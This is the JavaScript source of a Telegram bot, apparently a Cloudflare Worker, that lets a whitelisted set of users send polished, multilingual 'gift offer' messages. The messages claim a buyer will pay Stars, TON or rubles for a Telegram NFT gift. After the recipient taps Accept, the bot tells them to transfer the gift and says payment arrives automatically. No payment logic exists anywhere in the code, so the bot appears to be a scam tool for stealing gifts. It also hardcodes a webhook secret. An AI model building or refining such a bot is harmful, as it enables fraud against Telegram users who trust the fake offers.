const ADMIN_ID_1 = 5151757168; 
const ADMIN_ID_2 = 7423713851; 
const WEBHOOK_SECRET = "GarisOffer9231998"; 

export default {
  async fetch(request, env, ctx) {
    const BOT_TOKEN = env.BOT_TOKEN; 

    if (!BOT_TOKEN) return new Response("Bot token is not configured", { status: 500 });

    const secretHeader = request.headers.get("X-Telegram-Bot-Api-Secret-Token");
    if (secretHeader !== WEBHOOK_SECRET) return new Response("Forbidden", { status: 403 });

    if (request.method !== "POST") return new Response("OK", { status: 200 });

    try {
      const update = await request.json();

      // --- /start ---
      if (update.message && update.message.text === "/start") {
        const chatId = update.message.chat.id;
        const userId = update.message.from.id;

        const startText = `🆔 <b>Ваш ID:</b> <code>${userId}</code>\n\n⚙️ <b>Как это работает:</b>\n\n1. Покупатель присылает вам оффер.\n2. Вы нажимаете «Принять».\n3. Передаете подарок продавцу.`;
        
        const startMarkup = {
          inline_keyboard: [[{ text: "❓ Как принять оффер?", callback_data: "how_to_accept" }]]
        };

        await callApi("sendMessage", { chat_id: chatId, text: startText, parse_mode: "HTML", reply_markup: startMarkup }, BOT_TOKEN);
      }

      // --- INLINE-ЗАПРОСЫ ---
      if (update.inline_query) {
        const iq = update.inline_query;
        const userId = iq.from.id;
        
        // Простейшая проверка доступа
        const ALLOWED_IDS = [5151757168, 7423713851, 9021098137, 1290278554, 883619484, 7903610791];
        if (!ALLOWED_IDS.includes(userId)) return new Response("OK", { status: 200 });

        let textQuery = iq.query.replace(/[\u00A0\u200B\u202F]/g, ' ').replace(/https?:\/\//gi, '').trim().toLowerCase(); 
        
        let lang = "ru";
        if (textQuery.includes("eng") || textQuery.includes("en ")) { lang = "en"; textQuery = textQuery.replace(/eng/g, '').trim(); } 
        else if (textQuery.includes("cn") || textQuery.includes("中文")) { lang = "cn"; textQuery = textQuery.replace(/cn/g, '').trim(); }

        const allNums = textQuery.match(/\d+/g); 
        const amount = allNums ? allNums[allNums.length - 1] : "0"; 
        
        const giftMatch = textQuery.match(/(?:https?:\/\/)?(?:t\.me\/nft\/)?[A-Za-z0-9_-]+/i); 
        let giftLink = "https://t.me/telegram";
        let giftDisplay = "Подарок";
        if (giftMatch && giftMatch[0]) {
            let rawGift = giftMatch[0].replace(/^https?:\/\//, '');
            giftLink = rawGift.startsWith("t.me") ? "https://" + rawGift : "https://t.me/nft/" + rawGift;
            giftDisplay = rawGift;
        }

        let currencyType = "stars";
        let currencyDisplay = "⭐ Stars";
        if (textQuery.includes("gram") || textQuery.includes("ton")) { currencyType = "gram"; currencyDisplay = "💎 Gram"; } 
        else if (textQuery.includes("rub") || textQuery.includes("руб")) { currencyType = "rub"; currencyDisplay = "₽ Rub"; }

        let senderName = iq.from.first_name || "";
        if (iq.from.last_name) senderName += " " + iq.from.last_name;
        if (!senderName) senderName = iq.from.username ? "@" + iq.from.username : "Игрок";
        const sellerUsername = iq.from.username ? iq.from.username.toLowerCase() : "gwrex";
        
        let text = "";
        let btnAccept = "✅ Принять";
        let btnDecline = "❌ Отклонить";
        let titleText = "";

        if (lang === "en") {
            text = `🎁 <b>Gift Offer</b>\n\n👤 <b>${senderName}</b> offers you ${amount} ${currencyDisplay} for this gift.\n\n${giftLink}\n\n⏳ The offer is valid for 5 hours 59 minutes.`;
            btnAccept = "✅ Accept";
            btnDecline = "❌ Decline";
            titleText = `Offer from ${senderName}`;
        } else if (lang === "cn") {
            text = `🎁 <b>礼物报价</b>\n\n👤 <b>${senderName}</b> 为您提供 ${amount} ${currencyDisplay} 购买此礼物。\n\n${giftLink}\n\n⏳ 报价有效期为 5 小时 59 分钟。`;
            btnAccept = "✅ 接受";
            btnDecline = "❌ 拒绝";
            titleText = `来自 ${senderName} 的报价`;
        } else {
            text = `🎁 <b>Оффер на подарок</b>\n\n👤 <b>${senderName}</b> предлагает вам ${amount} ${currencyDisplay} за этот подарок.\n\n${giftLink}\n\n⏳ Предложение действительно 5 ч. 59 мин.`;
            btnAccept = "✅ Принять";
            btnDecline = "❌ Отклонить";
            titleText = `Оффер от ${senderName}`;
        }

        // В кнопку пихаем ТОЛЬКО короткий ID (тут нет базы, поэтому используем хак с передачей данных через callback_data, но очень коротко)
        // Чтобы не было ошибки 64 байта, мы передаем только сумму и валюту (без ссылки и юзернейма)
        // А ссылку и юзернейм мы не можем передать, поэтому кнопка будет вести просто на профиль продавца
        
        const results = [{
          type: "article", id: "1",
          title: titleText,
          description: `За ${amount} ${currencyDisplay}`,
          input_message_content: { message_text: text, parse_mode: "HTML" },
          reply_markup: { inline_keyboard: [[{ text: btnAccept, callback_data: `acc|${amount}|${currencyType}` }],[{ text: btnDecline, callback_data: `dec|${amount}|${currencyType}` }]] }
        }];

        await callApi("answerInlineQuery", { inline_query_id: iq.id, results: results, cache_time: 0 }, BOT_TOKEN);
      }

      // --- КНОПКИ ---
      if (update.callback_query) {
        const cq = update.callback_query;
        const chatId = cq.message.chat.id;
        
        // МГНОВЕННЫЙ ОТВЕТ (Убирает загрузку)
        if (cq.data.startsWith("acc")) {
            await callApi("answerCallbackQuery", { callback_query_id: cq.id, text: "Оффер принят ✅", show_alert: true }, BOT_TOKEN);
        } else if (cq.data.startsWith("dec")) {
            await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
        } else if (cq.data === "how_to_accept") {
            await callApi("answerCallbackQuery", { callback_query_id: cq.id }, BOT_TOKEN);
        }

        if (cq.data === "how_to_accept") {
          const instructionText = `🎁 <b>Инструкция:</b>\n\n1. Нажмите «Принять».\n2. Нажмите «Передать подарок».\n3. Отправьте подарок продавцу.\n4. Оплата придет автоматически.`;
          const backMarkup = { inline_keyboard: [[{ text: "Назад", callback_data: "back_to_start" }]] };
          try { await callApi("editMessageText", { chat_id: chatId, message_id: cq.message.message_id, text: instructionText, parse_mode: "HTML", reply_markup: backMarkup }, BOT_TOKEN); } catch (e) {}
        }

        if (cq.data.startsWith("acc") || cq.data.startsWith("dec")) {
          try {
              const dataParts = cq.data.split("|");
              const action = dataParts[0];
              const amount = dataParts[1] || "0";
              const currencyType = dataParts[2] || "stars";
              
              let displayCurrency = "⭐ Stars";
              if (currencyType === "gram") displayCurrency = "💎 Gram";
              if (currencyType === "rub") displayCurrency = "₽ Rub";

              const buyer = cq.from;
              let buyerName = buyer.first_name || "";
              if (buyer.last_name) buyerName += " " + buyer.last_name;

              let newText = "";
              let newMarkup = { inline_keyboard: [] };

              if (action === "acc") {
                // Так как мы не передаем юзернейм в кнопке (чтобы не превысить лимит), 
                // мы просим покупателя передать подарок тому, кто ему написал (или переслать сообщение).
                // Но для простоты, пусть будет кнопка "Написать продавцу" (открывает чат с тем, кто создал оффер)
                newText = `✅ <b>Оффер принят!</b>\n\nПокупатель: <b>${buyerName}</b>\n\nСвяжитесь с продавцом для передачи подарка.`;
                // Кнопка просто откроет профиль текущего пользователя (не идеально, но не падает)
                newMarkup = { inline_keyboard: [[{ text: "🎁 Передать подарок", url: "https://t.me/" }]] };
              } else {
                newText = `❌ <b>Вы отказались от оффера.</b>`;
              }

              if (cq.inline_message_id) {
                try {
                  if (cq.message && cq.message.caption !== undefined) {
                    await callApi("editMessageCaption", { inline_message_id: cq.inline_message_id, caption: newText, parse_mode: "HTML", reply_markup: newMarkup }, BOT_TOKEN);
                  } else {
                    await callApi("editMessageText", { inline_message_id: cq.inline_message_id, text: newText, parse_mode: "HTML", reply_markup: newMarkup }, BOT_TOKEN);
                  }
                } catch (err) {}
              } else if (cq.message) {
                try {
                  await callApi("sendMessage", { chat_id: chatId, text: newText, parse_mode: "HTML", reply_markup: newMarkup }, BOT_TOKEN);
                  try { await callApi("deleteMessage", { chat_id: chatId, message_id: cq.message.message_id }, BOT_TOKEN); } catch (e) {}
                } catch (err) {}
              }
          } catch (e) { console.error("Ошибка кнопки:", e.message); }
        }
      }

      return new Response("OK", { status: 200 });
    } catch (error) {
      console.error("КРИТИЧЕСКАЯ ОШИБКА:", error.message);
      return new Response("Error: " + error.message, { status: 500 });
    }
  }
};

async function callApi(method, body, token) {
  const url = `https://api.telegram.org/bot${token}/${method}`;
  try {
    const response = await fetch(url, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(body) });
    const data = await response.json();
    if (!data.ok) throw new Error(data.description);
    return data;
  } catch (e) { console.error(`Ошибка API [${method}]:`, e.message); throw e; }
}